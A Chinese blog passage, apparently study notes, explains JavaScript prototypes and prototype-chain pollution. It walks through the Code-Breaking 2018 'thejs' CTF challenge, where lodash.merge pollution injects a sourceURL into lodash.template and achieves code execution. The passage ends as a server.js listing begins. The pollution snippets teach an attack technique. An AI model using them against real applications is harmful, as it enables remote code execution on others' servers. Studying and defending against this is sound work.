<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(<span class="hljs-title class_">Calculator</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>, <span class="hljs-string">'__proto__'</span>, { <span class="hljs-attr">value</span>: <span class="hljs-number">123</span> })</code></pre>
<p>然后访问<code>calc.__proto__</code>，会发现它返回了<code>123</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697190652884-c58859f5-8f50-4ab4-a0e3-465fcc953bf8.png" alt="img"></p>
<p>由此我们对“new 做了什么”进行第二次<strong>修正</strong>：实际上<code>__proto__</code>属性也不是被添加上去的，而是继承自构造器的<code>prototype</code>属性</p>
<p>再一次刷新网页或者重置 JavaScript 环境，查看<code>Object.prototype</code>的<code>__proto__</code>值</p>
<pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697190928756-757169ee-1ff2-4fb2-884c-15232dc0661a.png" alt="img"></p>
<p>综合上述探索和测试，我们得到如下结论</p>
<ul>
<li>一个构造器的<code>prototype</code>的构造器指向这个构造器本身</li>
<li>访问<code>__proto__</code>会通过原型链<strong>继承</strong><code>Object.prototype.__proto__</code>的结果</li>
<li><code>__proto__</code>的尽头是<code>null</code></li>
<li>在默认情况下，一个对象（JSON 结构）的原型可通过它的<code>__proto__</code>属性反映</li>
</ul>
<h2 id="36-继承与原型链new-到底做了什么">3.6 继承与原型链：new 到底做了什么</h2>
<p>通过上面的探索，我们可以给出“new 做了什么”的最终答案：</p>
<p>new 的过程实际上就是根据构造器的<code>prototype</code>属性创建一个 JavaScript 对象（JSON 结构）的过程，它具有以下步骤：</p>
<ol>
<li>创建一个空的 JSON 结构</li>
<li>以这个新的 JSON 结构为 this，运行类的构造器<code>constructor</code></li>
<li>在程序内部将这个 JSON 结构的<strong>原型</strong>指向构造器的<code>prototype</code></li>
<li>返回这个新的 JSON 结构</li>
</ol>
<p>实例的属性由<code>constructor</code>函数对<code>this</code>添加属性而直接添加于实例（新的 JSON 结构）之下，属性是这个实例独有的，由相同构造器创建的其它实例具有它们独有的属性，互不影响</p>
<p>实例的方法<strong>继承</strong>自构造器的<code>prototype</code>，改变构造器中的<code>prototype</code>的内容将影响到所有由这个构造器创建的实例</p>
<p>当我们访问这个实例的<code>constructor</code>属性时，JavaScript 并没有在这个实例的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，并找到了<code>constructor</code>属性，然后返回它的值</p>
<p>当我们访问这个实例的<code>__proto__</code>属性时，JavaScript 并没有在这个实例的的 JSON 结构中找到对应的属性，转而向它的原型（构造器的<code>prototype</code>）寻找，在它的原型中也没有找到，转而继续向它的原型的原型（<code>Object.prototype</code>）寻找，并找到了<code>prototype</code>属性，并返回它的值，由于它是一个 Getter，所以 JavaScript 以所访问的实例为 this 返回了这个 Getter 函数的返回值</p>
<p>我们访问实例的<code>constructor</code>和<code>__proto__</code>属性的过程反映了 JavaScript 中的一个重要概念：<strong>原型</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="1697273666377-179f0753-f392-4490-adda-0cbcd4c8d921.png" alt="img"></p>
<h2 id="37-原型链污染">3.7 原型链污染</h2>
<p>原型链指的是由多个<code>__proto__</code>连在一起而形成的链式原型访问，如<code>calc.__proto__.__proto__</code></p>
<p>在默认情况下，一个对象（JSON 结构）的<code>__proto__</code>所指向的地址与对象原型的地址是一致的</p>
<p>由 JavaScript 的原型链查找建立起来的秩序使得构造器和实例处于一种稳定的关系之中，虽然我们通过<code>Object.defineProperty(obj, '__proto__', { value })</code>的方式改变一个对象的<code>__proto__</code>属性并不能改变这个对象的原型，但是我们却能够通过<code>__proto__</code>访问到它的原型</p>
<p>如果我们对它的原型进行一些修改，就能达到改变程序逻辑的目的，从而触发一些漏洞，这种人为通过原型链修改原型的行为成为<strong>原型链污染</strong>，是一种常见的攻击手段</p>
<p>对于大多数非 JavaScript 预定义的对象，可以通过<code>__proto__</code>或者<code>constructor.prototype</code>访问它的原型，对它原型下的属性进行修改可以造成原型链污染</p>
<p>emmm总的来说，代码基础有点差，从2.5之后看的就有点困难了，因此我再结合p神的看一遍吧。。。。</p>
<h1 id="0x04-深入理解-javascript-prototype-污染攻击">0x04 深入理解 JavaScript Prototype 污染攻击</h1>
<h2 id="41-prototype和__proto__分别是什么">4.1 <code>prototype</code>和<code>__proto__</code>分别是什么</h2>
<p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()</code></pre>
<p><code>Foo</code>函数的内容，就是<code>Foo</code>类的构造函数，而<code>this.bar</code>就是<code>Foo</code>类的一个属性。</p>
<blockquote>
<p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
</blockquote>
<p>一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数内部：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)
    }
}

(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()).<span class="hljs-title function_">show</span>()</code></pre>
<p>但这样写有一个问题，就是每当我们新建一个Foo对象时，<code>this.show = function...</code>就会执行一次，这个<code>show</code>方法实际上是绑定在对象上的，而不是绑定在“类”中。</p>
<p>我希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（prototype）了：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">1</span>
}

<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">show</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span>)
}

<span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()
foo.<span class="hljs-title function_">show</span>()</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="46109c07-bfa1-4b92-93a2-d86049274035.0dcd4f4c4400.png" alt="image.png"></p>
<p>我们可以认为原型<code>prototype</code>是类<code>Foo</code>的一个属性，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
<p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过prototype访问原型的。这时候，就该<code>__proto__</code>登场了。</p>
<p>一个Foo类实例化出来的foo对象，可以通过<code>foo.__proto__</code>属性来访问Foo类的原型，也就是说：</p>
<pre><code class="hljs js">foo.<span class="hljs-property">__proto__</span> == <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/3c4ed224-ae7b-4c8c-b16d-12b56524efee.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="3c4ed224-ae7b-4c8c-b16d-12b56524efee.e270c75493b0.png" alt="image.png"></a></p>
<p>所以，总结一下：</p>
<ol>
<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
<h2 id="42-javascript原型链继承">4.2 JavaScript原型链继承</h2>
<p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
<p>比如：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Father</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">'Donald'</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">'Trump'</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">'Melania'</span>
}

<span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Father</span>()

<span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Name: <span class="hljs-subst">${son.first_name}</span> <span class="hljs-subst">${son.last_name}</span>`</span>)</code></pre>
<p>Son类继承了Father类的<code>last_name</code>属性，最后输出的是<code>Name: Melania Trump</code>。</p>
<p>总结一下，对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p>
<ol>
<li>在对象son中寻找last_name</li>
<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/08c5d5d0-62da-40f9-9e2c-77831fa7488e.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="08c5d5d0-62da-40f9-9e2c-77831fa7488e.51324dd04eef.png" alt="image.png"></a></p>
<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
<ol>
<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承机制</li>
</ol>
<h2 id="43-原型链污染是什么">4.3 原型链污染是什么</h2>
<p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p>
<p>做个简单的实验：</p>
<pre><code class="hljs js"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span>
<span class="hljs-keyword">let</span> foo = {<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>}

<span class="hljs-comment">// foo.bar 此时为1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)

<span class="hljs-comment">// 修改foo的原型（即Object）</span>
foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span>

<span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)

<span class="hljs-comment">// 此时再用Object创建一个空的zoo对象</span>
<span class="hljs-keyword">let</span> zoo = {}

<span class="hljs-comment">// 查看zoo.bar</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)</code></pre>
<p>最后，虽然zoo是一个<strong>空</strong>对象<code>{}</code>，但<code>zoo.bar</code>的结果居然是2：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/4b63f1ef-6ed8-4448-9644-f11620822aaf.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="4b63f1ef-6ed8-4448-9644-f11620822aaf.2b2425c31fdb.png" alt="image.png"></a></p>
<p>原因也显而易见：因为前面我们修改了foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。</p>
<p>后来，我们又用Object类创建了一个zoo对象<code>let zoo = {}</code>，zoo对象自然也有一个bar属性了。</p>
<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
<h2 id="44-哪些情况下原型链会被污染">4.4 哪些情况下原型链会被污染</h2>
<p>在实际应用中，哪些情况下可能存在原型链能被攻击者修改的情况呢？</p>
<p>我们思考一下，哪些情况下我们可以设置<code>__proto__</code>的值呢？其实找到能够控制数组（对象）的“键名”的操作即可：</p>
<ul>
<li>对象merge–合并</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>以对象merge为例，我们想象一个简单的merge函数：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) {
        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) {
            <span class="hljs-title function_">merge</span>(target[key], source[key])
        } <span class="hljs-keyword">else</span> {
            target[key] = source[key]
        }
    }
}</code></pre>
<p>在合并的过程中，存在赋值的操作<code>target[key] = source[key]</code>，那么，这个key如果是<code>__proto__</code>，是不是就可以原型链污染呢？</p>
<p>我们用如下代码实验一下：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> o1 = {}
<span class="hljs-keyword">let</span> o2 = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"__proto__"</span>: {<span class="hljs-attr">b</span>: <span class="hljs-number">2</span>}}
<span class="hljs-title function_">merge</span>(o1, o2)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)

o3 = {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)</code></pre>
<p>结果是，合并虽然成功了，但原型链没有被污染：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/ba16d965-3112-4f69-bf5e-4eddb034e6dc.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="ba16d965-3112-4f69-bf5e-4eddb034e6dc.c5e82ea6e4f5.png" alt="image.png"></a></p>
<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = {a: 1, "__proto__": {b: 2}}</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让<code>__proto__</code>被认为是一个键名呢？</p>
<p>我们将代码改成如下：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> o1 = {}
<span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'{"a": 1, "__proto__": {"b": 2}}'</span>)
<span class="hljs-title function_">merge</span>(o1, o2)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)

o3 = {}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)</code></pre>
<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="5e05a46f-3c7b-4ab4-869c-fe6fd19422b7.64db1b9bbae7.png" alt="image.png"></a></p>
<p>这是因为，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
<p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p>
<h2 id="45-code-breaking-2018-thejs-分析">4.5 Code-Breaking 2018 Thejs 分析</h2>
<p>下面是p神出的题目，这里我也只是清楚了漏洞利用点，至于payload暂时不理解。。。</p>
<p>我在Code-Breaking 2018中出了一道原型链污染的CTF题目，为了更加贴合真实环境，我没有刻意加太多自己的代码，后端主要代码如下（完整代码可参考<a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">这里</a>）：</p>
<pre><code class="hljs js"><span class="hljs-comment">// ...</span>
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>)
<span class="hljs-comment">// ...</span>

app.<span class="hljs-title function_">engine</span>(<span class="hljs-string">'ejs'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) { 
<span class="hljs-comment">// define the template engine</span>
    fs.<span class="hljs-title function_">readFile</span>(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(err))
        <span class="hljs-keyword">let</span> compiled = lodash.<span class="hljs-title function_">template</span>(content)
        <span class="hljs-keyword">let</span> rendered = <span class="hljs-title function_">compiled</span>({...options})

        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, rendered)
    })
})
<span class="hljs-comment">//...</span>

app.<span class="hljs-title function_">all</span>(<span class="hljs-string">'/'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> data = req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> || {<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []}
    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">method</span> == <span class="hljs-string">'POST'</span>) {
        data = lodash.<span class="hljs-title function_">merge</span>(data, req.<span class="hljs-property">body</span>)
        req.<span class="hljs-property">session</span>.<span class="hljs-property">data</span> = data
    }

    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">'index'</span>, {
        <span class="hljs-attr">language</span>: data.<span class="hljs-property">language</span>, 
        <span class="hljs-attr">category</span>: data.<span class="hljs-property">category</span>
    })
})</code></pre>
<p>lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：</p>
<ol>
<li><code>lodash.template</code> 一个简单的模板引擎</li>
<li><code>lodash.merge</code> 函数或对象的合并</li>
</ol>
<p>其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p>
<p>而这里的<code>lodash.merge</code>操作实际上就存在原型链污染漏洞。</p>
<p>在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。我们看到<code>lodash.template</code>的代码：<a target="_blank" rel="noopener" href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p>
<pre><code class="hljs js"><span class="hljs-comment">// Use a sourceURL for easier debugging.</span>
<span class="hljs-keyword">var</span> sourceURL = <span class="hljs-string">'sourceURL'</span> <span class="hljs-keyword">in</span> options ? <span class="hljs-string">'//# sourceURL='</span> + options.<span class="hljs-property">sourceURL</span> + <span class="hljs-string">'\n'</span> : <span class="hljs-string">''</span>;
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">var</span> result = <span class="hljs-title function_">attempt</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Function</span>(importsKeys, sourceURL + <span class="hljs-string">'return '</span> + source)
  .<span class="hljs-title function_">apply</span>(<span class="hljs-literal">undefined</span>, importsValues);
});</code></pre>
<p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p>
<p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p>
<p>我将带有<code>__proto__</code>的Payload以json的形式发送给后端，因为express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2019/04/03/85fae11e-100b-41aa-9316-de81b93d0036.png"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="85fae11e-100b-41aa-9316-de81b93d0036.c6d39683853f.png" alt="image.png"></a></p>
<p>可见，我们代码执行成功，返回了id命令的结果。</p>
<h2 id="46-tips">4.6 Tips</h2>
<p>文章内关于原型和原型链的知识写的非常详细，就不再总结整个过程了，以下为几个比较重要的点：</p>
<ul>
<li>在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。</li>
</ul>
<p>例子：</p>
<pre><code class="hljs js">object.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span>=value</code></pre>
<ul>
<li>在javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：</li>
</ul>
<pre><code class="hljs js">objectname[<span class="hljs-string">"__proto__"</span>]
objectname.<span class="hljs-property">__proto__</span>
objectname.<span class="hljs-property">constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span></code></pre>
<ul>
<li>不同对象所生成的原型链如下(部分)：</li>
</ul>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>};
<span class="hljs-comment">// o对象直接继承了Object.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// o ---&gt; Object.prototype ---&gt; null</span>

<span class="hljs-keyword">var</span> a = [<span class="hljs-string">"yo"</span>, <span class="hljs-string">"whadup"</span>, <span class="hljs-string">"?"</span>];
<span class="hljs-comment">// 数组都继承于 Array.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>){
  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;
}
<span class="hljs-comment">// 函数都继承于 Function.prototype</span>
<span class="hljs-comment">// 原型链：</span>
<span class="hljs-comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></code></pre>
<h1 id="0x05-进一步理解-简化版">0x05 进一步理解-简化版</h1>
<h2 id="51-原型链污染原理">5.1 原型链污染原理</h2>
<p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
<p>来看一个简单的例子：</p>
<pre><code class="hljs plaintext">object1 = {"a":1, "b":2};
object1.__proto__.foo = "Hello World";
console.log(object1.foo);
object2 = {"c":1, "d":2};
console.log(object2.foo);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231030190629976.png" alt="image-20231030190629976"></p>
<p>​		最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
<h2 id="52-code-breaking-2018-thejs">5.2 Code-Breaking 2018 Thejs</h2>
<p>这回再跟着先知社区的佬过一遍</p>
<p>题目源码下载：<a target="_blank" rel="noopener" href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p>
<p>直接npm install可以把需要的模块下载下来。</p>
<p>server.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>)
<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'body-parser'</span>)
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>)
<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express-session'</span>)
<span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'randomatic'</span>)

